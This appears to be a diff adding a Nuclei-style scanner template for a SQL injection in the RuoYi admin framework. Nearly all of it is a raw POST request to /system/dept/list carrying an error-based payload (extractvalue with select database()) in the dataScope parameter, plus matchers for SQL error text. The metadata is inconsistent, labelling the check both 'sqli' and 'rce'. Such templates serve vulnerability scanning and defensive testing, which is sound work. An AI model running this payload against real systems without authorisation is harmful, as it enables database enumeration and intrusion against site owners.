@@ -1,0 +1,40 @@
+id: ruoyi-list-sqli
+info:
+  name: ruoyi-getNames-rce
+  author: ro1t
+  severity: high
+  metadata:
+    fofa-qeury: app=""
+  tags: ruoyi
+
+http:
+  - raw:
+      - |
+        POST /system/dept/list HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        sec-ch-ua-mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+        sec-ch-ua-platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: http://127.0.0.1/system/user
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=9b2fa9cc-71ce-4a5e-ad46-a9c82d44edfb
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 75
+
+        params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Error querying database"
+          - "SQL"
+
